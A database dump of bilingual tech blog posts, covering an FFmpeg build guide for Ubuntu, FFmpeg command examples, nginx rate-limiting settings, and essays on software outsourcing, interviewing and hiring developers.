Where the source files will be downloaded.<br />ffmpeg_build – Where the files will be built and libraries installed.<br />bin – Where the resulting binaries (ffmpeg, ffplay, ffserver, x264, and yasm) will be installed.<br />You can easily undo any of this as shown in Reverting Changes Made by This Guide.</p>\r\n<p>Yasm</p>\r\n<p>An assembler for x86 optimizations used by x264 and FFmpeg. Highly recommended or your resulting build may be very slow.</p>\r\n<p>If your repository offers a yasm package ≥ 1.2.0 then you can install that instead of compiling:</p>\r\n<p>sudo apt-get install yasm<br />Otherwise you can compile:</p>\r\n<p>cd ~/ffmpeg_sources<br />wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz<br />tar xzvf yasm-1.2.0.tar.gz<br />cd yasm-1.2.0<br />./configure --prefix=\"$HOME/ffmpeg_build\" --bindir=\"$HOME/bin\"<br />make<br />make install<br />make distclean<br />libx264</p>\r\n<p>H.264 video encoder. See the x264 Encoding Guide for more information and usage examples.</p>\r\n<p>Requires ffmpeg to be configured with --enable-gpl --enable-libx264 --extra-libs=-ldl.</p>\r\n<p>cd ~/ffmpeg_sources<br />wget http://download.videolan.org/pub/x264/snapshots/last_x264.tar.bz2<br />tar xjvf last_x264.tar.bz2<br />cd x264-snapshot*<br />PATH=\"$PATH:$HOME/bin\" ./configure --prefix=\"$HOME/ffmpeg_build\" --bindir=\"$HOME/bin\" --enable-static<br />PATH=\"$PATH:$HOME/bin\" make<br />make install<br />make distclean<br />libfdk-aac</p>\r\n<p>AAC audio encoder. See the AAC Encoding Guide for more information and usage examples.</p>\r\n<p>Requires ffmpeg to be configured with --enable-libfdk_aac (and --enable-nonfree if you also included --enable-gpl).</p>\r\n<p>sudo apt-get install unzip<br />cd ~/ffmpeg_sources<br />wget -O fdk-aac.zip https://github.com/mstorsjo/fdk-aac/zipball/master<br />unzip fdk-aac.zip<br />cd mstorsjo-fdk-aac*<br />autoreconf -fiv<br />./configure --prefix=\"$HOME/ffmpeg_build\" --disable-shared<br />make<br />make install<br />make distclean<br />libmp3lame</p>\r\n<p>MP3 audio encoder.</p>\r\n<p>Requires ffmpeg to be configured with --enable-libmp3lame.</p>\r\n<p>If your repository offers a libmp3lame-dev package ≥ 3.98.3 then you can install that instead of compiling:</p>\r\n<p>sudo apt-get install libmp3lame-dev<br />Debian 6 \"Squeeze\" users must compile:</p>\r\n<p>sudo apt-get install nasm<br />cd ~/ffmpeg_sources<br />wget http://downloads.sourceforge.net/project/lame/lame/3.99/lame-3.99.5.tar.gz<br />tar xzvf lame-3.99.5.tar.gz<br />cd lame-3.99.5<br />./configure --prefix=\"$HOME/ffmpeg_build\" --enable-nasm --disable-shared<br />make<br />make install<br />make distclean<br />libopus</p>\r\n<p>Opus audio decoder and encoder.</p>\r\n<p>Requires ffmpeg to be configured with --enable-libopus.</p>\r\n<p>If your repository offers a libopus-dev package ≥ 1.1 then you can install that instead of compiling:</p>\r\n<p>sudo apt-get install libopus-dev<br />Otherwise you can compile:</p>\r\n<p>cd ~/ffmpeg_sources<br />wget http://downloads.xiph.org/releases/opus/opus-1.1.tar.gz<br />tar xzvf opus-1.1.tar.gz<br />cd opus-1.1<br />./configure --prefix=\"$HOME/ffmpeg_build\" --disable-shared<br />make<br />make install<br />make distclean<br />libvpx</p>\r\n<p>VP8/VP9 video encoder and decoder. See the vpx (WebM) Encoding Guide for more information and usage examples.</p>\r\n<p>Requires ffmpeg to be configured with --enable-libvpx.</p>\r\n<p>cd ~/ffmpeg_sources<br />wget http://webm.googlecode.com/files/libvpx-v1.3.0.tar.bz2<br />tar xjvf libvpx-v1.3.0.tar.bz2<br />cd libvpx-v1.3.0<br />./configure --prefix=\"$HOME/ffmpeg_build\" --disable-examples<br />make<br />make install<br />make clean<br />ffmpeg</p>\r\n<p>Note: Server users can omit --enable-x11grab (this option is for x11 screen grabbing).</p>\r\n<p>cd ~/ffmpeg_sources<br />wget http://ffmpeg.org/releases/ffmpeg-snapshot.tar.bz2<br />tar xjvf ffmpeg-snapshot.tar.bz2<br />cd ffmpeg<br />PATH=\"$PATH:$HOME/bin\" PKG_CONFIG_PATH=\"$HOME/ffmpeg_build/lib/pkgconfig\" ./configure \\<br />  --prefix=\"$HOME/ffmpeg_build\" \\<br />  --extra-cflags=\"-I$HOME/ffmpeg_build/include\" \\<br />  --extra-ldflags=\"-L$HOME/ffmpeg_build/lib\" \\<br />  --bindir=\"$HOME/bin\" \\<br />  --extra-libs=\"-ldl\" \\<br />  --enable-gpl \\<br />  --enable-libass \\<br />  --enable-libfdk-aac \\<br />  --enable-libfreetype \\<br />  --enable-libmp3lame \\<br />  --enable-libopus \\<br />  --enable-libtheora \\<br />  --enable-libvorbis \\<br />  --enable-libvpx \\<br />  --enable-libx264 \\<br />  --enable-nonfree \\<br />  --enable-x11grab<br />PATH=\"$PATH:$HOME/bin\" make<br />make install<br />make distclean<br />hash -r<br />Conclusion</p>\r\n<p>Installation is now complete and ffmpeg is now ready for use. Your newly compiled FFmpeg programs are in ~/bin. To use it:</p>\r\n<p>Navigate to ~/bin and execute the binary: cd ~/bin &amp;&amp; ./ffmpeg -i ~/input.mp4 ~/videos/output.mkv (notice the ./)<br />Or you can use the full path to the binary: /home/yourusername/bin/ffmpeg -i ../input.mp4 ../videos/output.mkv<br />Or if you simply want to just issue the ffmpeg command and have your shell use your compiled binary see the Persistent Environment Variables section below.<br />Persistent Environment Variables</p>\r\n<p>You can tell your shell (assuming you\'re using Bash) to persistantly use your new ffmpeg in ~/bin. The first command will allow you to simply run man ffmpeg to get the FFmpeg man pages. The second command will source ~/.profile which will add ~/bin to your $PATH. In short, the following commands will allow you to simply type ffmpeg and man ffmpeg in your terminal and they will \"just work\":</p>\r\n<p>echo \"MANPATH_MAP $HOME/bin $HOME/ffmpeg_build/share/man\" &gt;&gt; ~/.manpath<br />. ~/.profile<br />Note:</p>\r\n<p>This may reset custom variables in the current shell session.<br />This assumes you are using the default ~/.profile (and therefore ~/.bashrc).<br />This assumes you are using Bash shell.<br />Sourcing the default ~/.profile will also source ~/.bashrc.<br />You may have to log out and then log in for man ffmpeg to work.<br />Don\'t worry: you can undo any of this as shown in Reverting Changes Made by This Guide.<br />See ​Ubuntu Wiki: Persistent Environment Variables for more info.</p>\r\n<p>Additional Notes</p>\r\n<p>See the x264 Encoding Guide for some encoding examples.<br />If you do not see FFmpeg developers in your ffmpeg console output then something went wrong and you\'re probably using the ​fake \"ffmpeg\" from the repository.<br />HTML formatted documentation is available in ~/ffmpeg_build/share/doc/ffmpeg.<br />You can keep the ffmpeg_sources directory if you plan on updating later. See Updating FFmpeg below for more details followed by instructions for reverting all changes made by this guide.<br />Updating FFmpeg</p>\r\n<p>Development of FFmpeg is active and an occasional update can give you new features and bug fixes. First you need to delete (or move) the old files:</p>\r\n<p>rm -rf ~/ffmpeg_build ~/ffmpeg_sources ~/bin/{ffmpeg,ffprobe,ffserver,vsyasm,x264,yasm,ytasm}<br />Now just follow the guide from the beginning.</p>\r\n<p>Reverting Changes Made by This Guide</p>\r\n<p>rm -rf ~/ffmpeg_build ~/ffmpeg_sources ~/bin/{ffmpeg,ffprobe,ffserver,vsyasm,x264,yasm,ytasm}<br />sudo apt-get autoremove autoconf automake build-essential libass-dev libfreetype6-dev libgpac-dev \\<br />  libmp3lame-dev libopus-dev libsdl1.2-dev libtheora-dev libtool libva-dev libvdpau-dev \\<br />  libvorbis-dev libvpx-dev libx11-dev libxext-dev libxfixes-dev texi2html zlib1g-dev<br />sed -i \'/ffmpeg_build/c\\\' ~/.manpath<br />hash -r</p>',0,'2014-06-20 07:44:00','2014-06-20 07:45:15','2014-06-20 08:18:37',1,NULL,'install-ffmpeg-on-ubuntu12-13','','','',197,'install-ffmpeg-on-ubuntu12-13'),(282,'nginx的限速相关(nginx limit download rate)','<p>CoreModule<br />限速<br />指令名称： limit_rate、limit_rate_after \\\\limit_rate_after用于设置http请求传输多少字节后开始限速<br />使用环境： http, server, location, if in location<br />示例：<br />location /download {<br />limit_rate_after 4m;<br />limit_rate 512k;<br />}<br /> <br />限制单个IP最大连接数（线程数）<br />指令名称： limit_conn_zone<br />使用环境： http<br />示例：<br />http {<br />limit_conn_zone $binary_remote_addr zone=client_addr:10m;  \\\\这是内存的开销<br />}<br />  <br />指令名称： limit_conn<br />使用环境： http, server, location<br />示例：<br />server {<br />location /download {<br />limit_conn client_addr 1;<br />}<br />}<br /> <br />隐藏Nginx版本信息：<br /># curl --head http://www.tianyun.com //查看主机的响应头信息<br />http{<br />server_tokens off;<br />}</p>',0,'2014-06-20 08:31:00','2014-06-20 08:40:05','2014-06-20 08:40:05',1,NULL,'nginx-limit-download-rate','','','',242,'nginx-limit-download-rate'),(283,'nginx worker process is shutting down ','<p>今天修改完nginx 的配置，重启之后，发现有 3个nginx进程是这样，其他5个左右都是正常的nginx; 看起来跟下图一样：  ( today I met a strange case that some of my nginx processes become \"is shutting down\" status. ) </p>\r\n<pre>nobody 6246 6241 0 10:51 ? 00:00:00 nginx: worker process \r\nnobody 6247 6241 0 10:51 ? 00:00:00 nginx: worker process \r\nnobody 6247 6241 0 10:51 ? 00:00:00 nginx: worker process \r\nnobody 6248 6241 0 10:51 ? 00:00:00 nginx: worker process \r\nnobody 6249 6241 0 10:51 ? 00:00:00 nginx: worker process \r\nnobody 7995 10419 0 Jan12 ? 00:20:37 nginx: worker process is shutting down \r\nnobody 7995 10419 0 Jan12 ? 00:20:37 nginx: worker process is shutting down \r\nnobody 7996 10419 0 Jan12 ? 00:20:11 nginx: worker process is shutting down \r\n</pre>\r\n<p> 经过google, 才知道这是 nginx -s reload之后， nginx 正在平滑的重启。(graceful reboot) 。 等调用对应nginx 的进程结束之后，这个process就会重启了。  (after googling, I found that the root cause is nginx\'s graceful reboot.  the nginx process which shoud be shut down is still responding a request, and it will restart once the current request is done ) </p>\r\n<p>果然，大约20分钟后，这些进程都变成了 \'worker process\' 了。( 20 minutes later, all the nginx worker are rebooted )&#160;</p> ',0,'2014-06-20 10:13:00','2014-06-20 10:19:11','2014-06-20 10:19:11',1,NULL,'nginx-worker-is-shutting-down','','','',253,'nginx-worker-is-shutting-down'),(284,'ffmpeg useful commands (FFMPEG 命令大全）','<p> see: <a href=\"http://www.labnol.org/internet/useful-ffmpeg-commands/28490/\">http://www.labnol.org/internet/useful-ffmpeg-commands/28490/</a> for details </p>\r\n\r\n<div class=\"post-content\"> <p>FFmpeg is an extremely powerful and versatile command line tool for converting audio and video files. It is free and available for Windows, Mac and Linux machines. Whether you want to join two video files, extract the audio component from a video file, convert your video into an animated GIF, FFmpeg can do it all and even more.</p>\r\n\r\n<pre>#  合并静态 图片和 声音 （声音需要先生成静音文件）\r\n$ ffmpeg -i silence.mp3 -loop 1 -i zuoshi_title.jpg  -c:v libx264 -c:a aac -strict experimental -b:a 192k -shortest zuoshi_title.mp4\r\n\r\n# 合并 音乐和 视频 （mp3 + mp4 )\r\n$ ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental -shortest output.mp4\r\n\r\n# 增加字幕\r\n# add srt format subtitle to mp4: \r\n$ ffmpeg -i zhangong-header.mp4 -vf subtitles=zhangong.srt zhangong-header-out.mp4\r\n\r\n # add subtitle to mp4 file (using ass format)\r\n ffmpeg -i zhangong.srt zhangong.ass\r\n ffmpeg -i zhangong-header.mp4 -vf \'ass=zhangong.ass\' zhangong-header-subtitle.mp4\r\n\r\n # 如果向现有的MP4中增加背景音乐，需要： \r\n # 1. 从原来的MP4中获取MP3\r\n $ ffmpeg -i zuogong-ok.mp4 -vn -ab 256k zuogong_koulingci.mp3\r\n # 2. 将 mp3 与 背景音乐MP3合并 ，成为 new_music.mp3 (using audacity) \r\n # 3. 将 原来的MP4静音‘\r\n $ ffmpeg -i zuogong-ok.mp4 -an zuogong-muted.mp4\r\n # 4. 合并静音后的MP4与 new_music.mp3\r\n $ ffmpeg -i zuogong-muted.mp4 -i zuogong-koulingci-with-music.mp3 -c:v copy -c:a aac -strict experimental zuogong-with-koulingci-and-music.mp4\r\n</pre>\r\n<p>转换成GIF动画： $ffmpeg -i climax.mp4 -ss 00:00:00 -pix_fmt rgb24 -r 10 -s 320x180 -t 00:00:12 out.gif</p>\r\n\r\n  <div id=\"attachment_28491\" style=\"width: 602px\" class=\"wp-caption alignnone\"><p><img src=\"http://img.labnol.org/di/ffmpeg.gif\" alt=\"Extract the audio from a video file with this simple FFmpeg command.\" width=\"592\" height=\"342\" class=\"size-full wp-image-28491\" /></p>\r\n<p class=\"wp-caption-text\">Extract the audio from a video file with this simple FFmpeg command.</p>\r\n</div> <h2>Useful FFmpeg Commands</h2> <p>FFmpeg supports all popular audio and video formats. Or you can running the command <em>./ffmpeg -formats</em> to get a list of every format that is supported by your FFmpeg installation. If you are just getting started, here are some commands that will give you good idea of the capabilities of this tool.</p> <h4>1. Cut video file into a smaller clip</h4> <p>You can use the time offset parameter (-ss) to specify the start time stamp in HH:MM:SS.ms format while the -t parameter is for specifying the actual duration of the clip in seconds.</p> <pre>ffmpeg -i input.mp4 -ss 00:00:50.0 -codec copy -t 20 output.mp4</pre> <h4>2. Split a video into multiple parts</h4> <p>If you want to split a large video into multiple smaller clips without re-encoding, ffmpeg can help. This command will split the source video into 2 parts – one ending at 50s from the start and the other beginning at 50s and ending at the end of the input video.</p> <pre>ffmpeg -i video.mp4 -t 00:00:50 -c copy small-1.mp4 -ss 00:00:50 -codec copy small-2.mp4</pre> <h4>3. Convert video from one format to another</h4> <p>You can use the -vcodec parameter to specify the encoding format to be used for the output video. Encoding a video takes time but you can speed up the process by forcing a preset though it would degrade the quality of the output video.</p> <pre>ffmpeg -i youtube.flv -c:v libx264 filename.mp4</pre> <pre>ffmpeg -i video.wmv -c:v libx264 -preset ultrafast video.mp4</pre> <h4>4. Join (concatenate) video files</h4> <p>If you have multiple audio or video files encoded with the same codecs, you can join them into a single file using FFmpeg. Create a input file with a list of all <a href=\"https://ffmpeg.org/trac/ffmpeg/wiki/How%20to%20concatenate%20%28join,%20merge%29%20media%20files\">source files</a> that you wish to concatenate and then run this command.</p> <pre>ffmpeg -f concat -i file-list.txt -c copy output.mp4</pre> <h4>5. Mute a video (Remove the audio component)</h4> <p>Use the -an parameter to disable the audio portion of a video stream.</p> <pre>ffmpeg -i video.mp4 -an mute-video.mp4</pre> <h4>6. Extract the audio from video</h4> <p>The -vn switch extracts the audio portion from a video and we are using the -ab switch to save the audio as a 256kbps MP3 audio file.</p> <pre>ffmpeg -i video.mp4 -vn -ab 256k audio.mp3</pre> <h4>7. Convert a video into animated GIF</h4> <p>FFmpeg is an excellent tool for converting videos into <a href=\"http://www.labnol.org/software/video-demo-with-animated-gif/28095/\">animated GIFs</a> and the quality isn’t bad either. Use the scale filter to specify the width of the GIF, the -t parameter specific the duration while -r specifies the frame rate (fps).</p> <pre>ffmpeg -i video.mp4 -vf scale=500:-1 -t 10 -r 10 image.gif</pre> <h4>8. Extract image frames from a video</h4> <p>This command will extract the video frame at the 15s mark and saves it as a 800px wide JPEG image. You can also use the -s switch (like -s 400×300) to specify the exact dimensions of the image file though it will probably create a stretched image if the image size doesn’t follow the aspect ratio of the original video file.</p> <pre>ffmpeg -ss 00:00:15 -i video.mp4 -vf scale=800:-1 -vframes 1 image.jpg</pre> <h4>9. Convert Video into Images</h4> <p>You can use FFmpeg to automatically <a href=\"http://www.labnol.org/software/extract-image-frames-from-video/18137/\">extract image frames</a> from a video every ‘n’ seconds and the images are saved in a sequence. This command saves image frame after every 4 seconds.</p> <pre>ffmpeg -i movie.mp4 -r 0.25 frames_%04d.png</pre> <h4>10. Merge an audio and video file</h4> <p>You can also specify the -shortest switch to finish the encoding when the shortest clip ends.</p> <pre>ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental output.mp4</pre> <pre>ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental -shortest output.mp4</pre> <h4>11. Resize a video</h4> <p>Use the size (-s) switch with ffmpeg to resize a video while maintaining the aspect ratio.</p> <pre>ffmpeg -i input.mp4 -s 480x320 -c:a copy output.mp4</pre> <h4>12. Create video slideshow from images</h4> <p>This command creates a <a href=\"http://www.labnol.org/internet/street-view-time-lapse/20504/\">video slideshow</a> using a series of images that are named as img001.png, img002.png, etc. Each image will have a duration of 5 seconds (-r 1/5).</p> <pre>ffmpeg -r 1/5 -i img%03d.png -c:v libx264 -r 30 -pix_fmt yuv420p slideshow.mp4</pre> <h4>13. Add a poster image to audio</h4> <p>You can add a cover image to an audio file and the length of the output video will be the same as that of the input audio stream. This may come handy for uploading MP3s to YouTube.</p> <pre>ffmpeg -loop 1 -i image.jpg -i audio.mp3 -c:v libx264 -c:a aac -strict experimental -b:a 192k -shortest output.mp4</pre> <h4>14. Convert a single image into a video</h4> <p>Use the -t parameter to specify the duration of the video.</p> <pre>ffmpeg -loop 1 -i image.png -c:v libx264 -t 30 -pix_fmt yuv420p video.mp4</pre> <h4>15. Add subtitles to a movie</h4> <p>This will take the subtitles from the .srt file. FFmpeg can decode most common subtitle formats.</p> <pre>ffmpeg -i movie.mp4 -i subtitles.srt -map 0 -map 1 -c copy -c:v libx264 -crf 23 -preset veryfast output.mkv</pre> <h4>16. Crop an audio file</h4> <p>This will create a 30 second audio file starting at 90 seconds from the original audio file without transcoding.</p> <pre>ffmpeg -ss 00:01:30 -t 30 -acodec copy -i inputfile.mp3 outputfile.mp3</pre> <h4>17. Change the audio volume</h4> <p>You can use the volume filter to alter the volume of a media file using FFmpeg. This command will half the volume of the audio file.</p> <pre>ffmpeg -i input.wav -af \'volume=0.5\' output.wav</pre> <h4>18. Rotate a video</h4> <p>This command will <a href=\"http://www.labnol.org/software/tutorials/rotate-video-vertical-clips-90-degrees-virtualdub/2657/\">rotate a video clip</a> 90° clockwise. You can set transpose to 2 to rotate the video 90° anti-clockwise.</p> <pre>ffmpeg -i input.mp4 -filter:v \'transpose=1\' rotated-video.mp4</pre> <p>This will rotate the video 180° counter-clockwise.</p> <pre>ffmpeg -i input.mp4 -filter:v \'transpose=2,transpose=2\' rotated-video.mp4</pre> <h4>19. Speed up or Slow down the video</h4> <p>You can change the speed of your video using the setpts (set presentation time stamp) filter of FFmpeg. This command will make the video 8x (1/8) faster or use setpts=4*PTS to make the video 4x slower.</p> <pre>ffmpeg -i input.mp4 -filter:v \"setpts=0.125*PTS\" output.mp4</pre> <h4>20. Speed up or Slow down the audio</h4> <p>For changing the speed of audio, use the atempo audio filter. This command will double the speed of audio. You can use any value between 0.5 and 2.0 for audio.</p> <pre>ffmpeg -i input.mkv -filter:a \"atempo=2.0\" -vn output.mkv</pre> <p>Stack Exchange has a <a href=\"http://blog.superuser.com/2012/02/24/ffmpeg-the-ultimate-video-and-audio-manipulation-tool/\">good overview</a> to get you started with FFmpeg. You should also check out the official documentation at <a href=\"http://ffmpeg.org/ffmpeg.html\">ffmpeg.org</a> or the wiki at <a href=\"https://trac.ffmpeg.org/wiki\">trac.ffmpeg.org</a> to know about all the possible things you can do with FFmpeg.</p>\r\n<p id=\"26\"> </p>\r\n<div class=\"googleadsrectangle\" style=\"width:336px; height: 280px\"> <ins class=\"adsbygoogle\" style=\"display:inline-block;width:336px;height:280px\" data-ad-client=\"ca-pub-5952668961385621\" data-ad-slot=\"2429224458\" data-adsbygoogle-status=\"done\"><ins style=\"display:inline-table;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent\"><ins id=\"aswift_1_anchor\" style=\"display:block;border:none;height:280px;margin:0;padding:0;position:relative;visibility:visible;width:336px;background-color:transparent\"><iframe width=\"336\" height=\"280\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" id=\"aswift_1\" style=\"left:0;position:absolute;top:0;\"></iframe>\r\n</ins>\r\n</ins>\r\n</ins> </div>   <p>Also see: <a href=\"http://www.labnol.org/software/linux-commands/19028/\">Essential Linux Commands</a>\r\n</p> </div>',0,'2014-06-22 21:02:00','2014-06-22 21:04:17','2014-07-02 12:47:10',1,NULL,'ffmpeg-useful-commands','','','',289,'ffmpeg-useful-commands'),(285,'分享一个制作各种动画的站点 （ an excellent font-end website for coders ) ','<p>http://tympanus.net/codrops/category/articles/</p>',0,'2014-06-23 10:01:00','2014-06-23 10:02:55','2014-06-23 10:02:55',1,NULL,'excellent-front-end-website','','','',237,'excellent-front-end-website'),(286,'移动CMS与传统CMS的主要区别','<p>最主要区别： 移动APP 需要顾及原有的版本。 做各种兼容。而传统的不需要。</p>\r\n<p>版本：</p>\r\n<p>pid：</p>\r\n<p>预览：</p>\r\n<p>清理缓存：</p>',0,'2014-06-25 01:58:00','2014-06-25 02:00:41','2014-06-25 02:00:41',1,NULL,'difference-between-mobile-cms-and-ordinary-cms','','','',168,'difference-between-mobile-cms-and-ordinary-cms'),(287,'面试时的问题 (questions for an interview) ','<p>1. &#160;谈谈上一次项目</p>\r\n<p>&#160;谈谈了解的设计模式</p>\r\n<p>&#160;CSS： &#160;border, margin, padding 从外到内的顺序？ &#160; class, id, 标签 在定义CSS时的权重？</p>\r\n<p>jquery ： 在项目中用过哪些组件？ &#160;是否参与过开源项目？ 用JS在项目中做什么？</p>\r\n<p>设计模式，单元测试&#160;</p>\r\n<p>LINUX 相关</p>\r\n<p>问题： 1. 喜欢刁难人的同事如何沟通？ 2. 对于工作压力巨大，能否加班？&#160;</p>\r\n<p>觉得自己的优点和缺点？</p>\r\n<p>考察口语： 上一次的项目</p>',0,'2014-06-25 06:27:00','2014-06-25 06:36:00','2014-06-25 06:36:00',1,NULL,'questions-for-interview','','','',192,'questions-for-interview'),(288,'在国内软件队伍中生存？ working in non-agile team','<p>1。 坚持学习</p>\r\n<p>2. &#160; 坚持写单元测试，自动化</p>\r\n<p>3. &#160; 坚持使用自动化的东西</p>',0,'2014-06-25 07:10:00','2014-06-25 07:12:39','2014-06-25 07:12:39',1,NULL,'working-in-non-agile-team','','','',185,'working-in-non-agile-team'),(289,'书稿 技术的重要性','<h3>经验： &#160;绝对不要找太便宜的软件承接方。</h3>\r\n<p>互联网创业，绝对不要找太便宜的 人，和团队。 跟其他行业一样。软件行业也是一分钱一分货。出的钱高，就能找到靠谱的人或者团队。 出的钱低，那么获得的软件质量也不敢恭维。</p>\r\n<p>案例： 某位朋友，需要做的项目量级上千万。但是在软件投入方面仅仅是10万。 结果对方无法保证项目的按时交付。</p>\r\n<p>深层分析：在北京，一个3年经验的程序员月薪假设1W， 那么在一个正规的公司，每个月要为他消耗2W。 如果某个项目， 需要5人月（就是需要一个人干5个月。 人月： 是衡量软件工期的单位。）那么它的成本就是10W。 &#160;如果你的项目以低于成本价的价格 外包出去。那么80%是失败的。 因为对方是一个连成本都不会估算的软件承接方。不要指望他能很好的控制工期进度。</p>\r\n<h3>经验：明确互联网在自己项目中的位置。</h3>\r\n<p>很多朋友，在自己的项目中，不太明确互联网技术的地位。比如： 某个项目，又有线下的实体商店，又有线上的 网店， 有移动应用APP。那么，该如何确认自己的项目是否是一个“互联网项目”呢？ 很简单。 你就假设自己没有移动APP， 没有线上的网店，你看看这个项目能不能正常运转。 如果不能的话，你就要小心了。 &#160;如果你为自己的项目整体估值1000W。 那么你务必不要把自己的互联网技术上的预算弄得太低。</p>\r\n<h3>经验： 一个靠谱的技术开发团队的运营成本。</h3>\r\n<p>什么样的团队是靠谱的？ 1 。 诚信，不忽悠客户。 2. 有扎实的技术，和成功的案例。&#160;</p>\r\n<p>一般来说，这样团队的组成是：&#160; 开发人员（2，3名） + 测试人员（1名） + 项目经理（1名） + 运维人员（1名）&#160;\r\n</p>\r\n<p>而一个互联网项目，给这个团队做的话，最少要做6个月，要做成熟的按照1年时间来算， 5人 X 12 个月 X 2W。 = 120W &#160;</p>\r\n<p>如果考虑到这个项目除了PC端，还要上移动端（只考虑IOS，ANDROID，不考虑winphone等）, 那么开发人员还要增加2～4名，</p>\r\n<p>这个时候的成本就是： &#160;170 ~ 220 W. &#160;&#160;</p>\r\n<p>结论： 如果没有足够的干粮（比如说200W） 做好未来一年挨饿的准备，那么团队是养不起的。</p>\r\n<h3>经验：外包项目与自己培养团队的比较</h3>\r\n<p>把项目外包出去是一个不得已的选择。如果资金允许，务必要培养自己的团队。 因为在软件项目中，“人”才是最重要的。代码不重要。 只要有高素质的人存在， 那么你的项目就会一帆风顺。 我见过的比较多的情况是：<br />某项目，干了1期。 交付了。然后开发人员消息了（可能是他离职，可能是该团队解散，公司关掉等等） 然后来了一个人，继续接手。 如果这个人是个经验丰富的老手， 可以看懂前任程序员的代码，那么他大约需要一段时间来很痛苦的阅读和理解前任的代码。 同时做各种修改，各种重构（改善现有代码的结构）。 如果这个人是个菜鸟，前任作者的代码他看不懂，那么完了，估计前任作者30分钟的工作，这个新人可能要做一周。（在《人件》 以及《软件工程的45个事实和悖论》中有更加精彩的论述）。<br /><br />所以，除非你的项目不需要谁维护，否则不要外包出去。（我所有见过的成功交付的项目，都会要求做第二期，第三期。。。）<br /><br />外包的唯一优势就是：我们不需要一直“养”着一个团队。需要人的时候我直接找外包团队来做就可以。 如果你手头没有足够的资金，但是又需要在1个月内做出一款线上的产品的话，确实一个可行的选择。但是如同“壮士断腕”，它的副作用相当巨大。可能你在做第二期的时候把前期外包的成果“推倒重来”。—— 原因是外包软件的整体架构不被新团队所理解，而且你也找不到原来作者了。&#160;</p>\r\n<p>结论：能不外包就绝对不要外包。一旦做了外包，就做好承担更大失败风险和日后 还债的准备。</p>\r\n<h3>经验：如何保证你的项目进度？</h3>\r\n<p>务必要让程序员过来跟你一起工作。 最好是面对面，或者坐邻居工位。 能够有个开放式的环境，大家围坐在一起更好。 程序员有了问题可以直接问项目经理，项目经理想查看进度时，也可以面对面找程序员，大家还可以有每天上午10点的站立会议（注意：要站着，每个人发言不超过1分钟，讲述自己今天要做的事情和昨天遇到的问题）<br />每天都做交付（见敏捷开发的 “项目自动化”）。 做到一键部署，这样我们的产品经理每天下班前都会看到哪个哪个新特性上了线。</p>\r\n<h3>经验：产品经理如何提需求？</h3>\r\n<p>要“小步快跑”。 比如，老板脑子里有100个点子，而这一百个点子在目前的项目资源中是无法得到全部分配的（通俗的说，我们目前只能在一个月内完成5个点子），那么就把这100个点子做个排序： 第一期项目先做这5个点子。 &#160; 等项目一期做了交付之后，我们再上另外10个点子（或者需求） 。。。等等等等。 这样小步快跑，项目才能成功。</p>\r\n<p>《人月神话》： 如果某个项目的时间估算（交付时间）超过了1年，那么它基本上会失败。 如果超过2年，那么绝对会失败。</p>\r\n<h3>经验：如何保证项目的稳定？（或者说，如何搞垮你的竞争对手？）</h3>\r\n<p>办法很多。 如果你发现对方的项目是花5千块请的大四学生做的，那么恭喜你，它肯定会在3个月内垮掉。不需要你做什么。<br /></p>\r\n<h3>经验：如何组建技术团队？</h3>',0,'2014-06-29 05:48:00','2014-06-29 06:07:28','2014-06-29 06:39:51',1,NULL,'things-you-should-know-before-starting-a-project','','','',209,'things-you-should-know-before-starting-a-project'),(290,'候选人的选择： 应届生 V.S. 社招生 (refresh-graduate v.s. candidate with x years exp)','<p>我们组一直在招人。 理想的情况是：有着工作经验，勤奋好学，吃苦耐劳的精英。 但是随着面试的跟进，看法变了：<br />一般看好应届生。 社招生平庸的太多。</p>\r\n<p>1. 比较性格 （面对各种带有压力的提问，都可以很好的做回答。）<br />我在非技术层面会问两个问题：<br />&#160; （1） 优酷的工作压力很大，很辛苦，很多人在加班，你对这个问题怎么看？ &#160;几乎所有应届生都说： “可以加班，年轻的时候就应该吃苦”。 &#160;然后我会进一步的问： “如果我问得过分些，能告诉我每天你可以额外加班几个小时吗？ \" 得到的回答都是2个小时以上。最猛的一个兄弟说可以睡在公司，可以干到12点。 我进一步再问：“周六和周日两天可以来吗？” &#160;所有的回答都是“可以的”。 &#160;&#160;</p>\r\n<p>&#160;（2） 第二个问题： “我们的项目一般都是分配给不同的人来做的。如果你和另外一个同学搭档，而他的脾气比较坏，比较喜欢踢皮球。在某天，有一个新特性要实现，从中立的技术人员的角度看，30%的几率应该放在你这里， 70%的几率可以放到他那里。 但是他就是很强硬的要求放在你这里。 你该怎么办？” &#160; （ 这个问题考虑的是面试者的沟通能力，沟通技巧，面对棘手问题的处理能力，所以没有固定的答案）&#160;</span>比较好的回答是： “我会先跟他耐心的沟通。告诉他这个东西坐在他那里是合适的”<br />我这时会进一步问：“如果对方很强硬，就是一定要做在你这里，怎么办？”<br />这个问题所有的人都会犹豫一段时间，（确实很让人郁闷的情况），但是几乎所有的优秀应届生都会说“就先做在我这里吧。 多写一些代码就能解决问题了。不踢皮球”。&#160;<br /><br />很好。 于是我会进一步问道：“ 好的。如果还有第二次的情况， 对方还是很强硬，把本来他该做的事情（60%的几率该他做，30～40%的几率该你做）放在你这里呢？” &#160;这个时候比较好的回答就是“再次跟对方沟通， 比较客气和客观的表达出自己的看法： 团队协作的重要性。 上次我做了，这次该你来了。等等”。 &#160; （这个问题考察的是对方对沟通看中的重要性。 看他是否是比较软弱，没有主见）&#160;<br /><br />然后我会抛出杀手锏：“如果你之前做的这个东西，最后出了问题，老大们追究责任的时候，发现这个东东是你做的。所以现在的情况是，你做了别人的事情，不但没有额外得到嘉奖，却‘多做多错’了。 &#160;怎么办？”&#160;<br /><br />于是我得到的所有回答都是： “没关系。因为这个东西是我做的。我做了就要承担责任” &#160; &#160; 。 &#160;&#160;<br /><br />这样的员工，赶紧收了吧。 &#160;&#160;</p>\r\n<p>2. 几乎没有对象。 （呃，我们IT人是不是很苦B？ ） &#160; 所以不会出现 提前下班买菜接孩子的现象。&#160;</p>\r\n<p>3. 更容易得到学习能力强的应届生。 &#160;</p>\r\n<p>从接收到的简历来看，都是学习能力强的应届生。 